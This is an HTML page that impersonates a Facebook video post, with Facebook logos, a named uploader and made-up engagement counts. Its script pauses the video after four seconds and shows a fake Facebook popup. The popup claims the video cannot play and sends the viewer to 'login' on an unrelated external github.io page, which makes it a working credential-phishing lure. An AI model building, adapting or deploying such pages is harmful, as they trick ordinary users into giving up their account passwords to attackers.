<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook-like Video Player</title>
<style>
  /* Custom styles for the pop-up dialogue */
  .popup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #fff;
    border-radius: 10px;
    padding: 30px;
    box-shadow: 0 0 20px rgba(0,0,0,0.3);
    z-index: 9999;
  }
  
  .popup img {
    width: 60px;
    height: 60px;
    margin-bottom: 20px;
  }
  
  .popup h2 {
    margin-top: 0;
    font-size: 24px;
    color: #333;
  }
  
  .popup p {
    font-size: 18px;
    color: #333;
    margin-bottom: 20px;
  }
  
  .popup button {
    padding: 12px 24px;
    font-size: 18px;
    background-color: #3b5998;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
  }
</style>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0;">

<div style="background-color: #3b5998; color: #fff; padding: 20px;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 60px; height: 60px; margin-right: 20px;">
  <h1 style="font-size: 28px; margin: 0;">Facebook-like Video Player</h1>
</div>

<div style="background-color: #fff; max-width: 600px; margin: 20px auto; border-radius: 8px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.1);">
  <div style="padding: 30px;">
    <h2 style="font-size: 24px; color: #000; margin-top: 0;">Natasha Afrin</h2>
    <div style="display: flex; align-items: center; margin-bottom: 20px;">
      <div style="flex-grow: 1;">
        <p style="font-size: 18px; color: #606770; margin-bottom: 10px;"><strong>Awesome Song Video</strong></p>
        <img src="https://i.postimg.cc/T33StK4B/profile-modified.png" alt="Profile Picture" style="width: 60px; height: 60px; border-radius: 50%; margin-right: 20px;">
      </div>
    </div>
    <p style="font-size: 18px; color: #606770; margin-bottom: 20px;">Please Like, Comment, Share</p>
  </div>
  <video id="myVideo" controls autoplay style="width: 100%; height: 240px;">
    <source src="video.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <div style="padding: 20px; background-color: #f0f2f5;">
    <div style="display: flex; justify-content: space-between; color: #606770; font-size: 16px;">
      <div>Likes: 1.5k</div>
      <div>Comments: 500</div>
      <div>Shares: 198</div>
    </div>
  </div>
</div>

<!-- Pop-up dialogue -->
<div id="popup" class="popup">
  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
  <h2>Facebook</h2>
  <p>Sorry, we cannot play this video. Please <a href="https://gtaonbd.github.io/online-service/app" style="color: #3b5998; text-decoration: none;">login</a> to watch the full video.</p>
  <a href="https://gtaonbd.github.io/online-service/app" style="text-decoration: none;"><button>Login</button></a>
</div>

<script>
  // JavaScript to display pop-up dialogue after 4 seconds of video play
  document.addEventListener('DOMContentLoaded', function() {
    var video = document.getElementById('myVideo');
    video.addEventListener('play', function() {
      setTimeout(function() {
        document.getElementById('popup').style.display = 'block';
        video.pause();
      }, 4000);
    });
  });
</script>

</body>
</html>
